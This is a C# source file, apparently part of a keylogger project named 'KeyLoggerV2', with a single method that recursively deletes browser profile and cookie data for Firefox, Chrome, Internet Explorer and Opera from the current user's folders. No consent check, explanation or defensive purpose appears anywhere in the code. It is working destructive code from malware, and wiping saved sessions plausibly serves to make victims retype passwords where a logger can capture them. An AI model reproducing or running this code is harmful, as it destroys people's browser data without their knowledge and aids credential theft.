using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.Remoting.Contexts;
using System.Text;
using System.Threading.Tasks;

namespace KeyLoggerV2
{
    class Browser
    {
        public void DeleteBrowser()
        {
            string path1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string path2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            //Folder for Firefox
            try
            {
                string path = path1 + '\\' + "Mozilla" + '\\' + "Firefox" + '\\' + "Profiles";

                Directory.Delete(path, true);
            }
            catch (Exception)
            {
                
                throw;
            }
            //File for Firefox
            try
            {
                string path = path1 + '\\' + "Mozilla" + '\\' + "Firefox" + '\\' + "profiles.ini";

                File.Delete(path);
            }
            catch (Exception)
            {

                throw;
            }

            //Folder for Chrome
            try
            {
                string path = path2 + '\\' + "Google" + '\\' + "Chrome" + '\\' + "User Data";

                Directory.Delete(path, true);
            }
            catch (Exception)
            {

                throw;
            }
            //Folder for IE
            try
            {
                string path = path1 + '\\' + "Microsoft" + '\\' + "Windows" + '\\' + "Cookies";

                Directory.Delete(path, true);
            }
            catch (Exception)
            {

                throw;
            }
            //Folder for IE 2
            try
            {
                string path = path1 + '\\' + "Microsoft" + '\\' + "Internet Explorer" + '\\' + "User Data";

                Directory.Delete(path, true);
            }
            catch (Exception)
            {

                throw;
            }
            //Folder for Opera
            try
            {
                string path = path1 + '\\' + "Opera" + '\\' + "Opera";

                Directory.Delete(path, true);
            }
            catch (Exception)
            {

                throw;
            }
            //Delete Cookies
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.Cookies);

                Directory.Delete(path, true);
            }
            catch (Exception)
            {

                throw;
            }
        }
    }
}
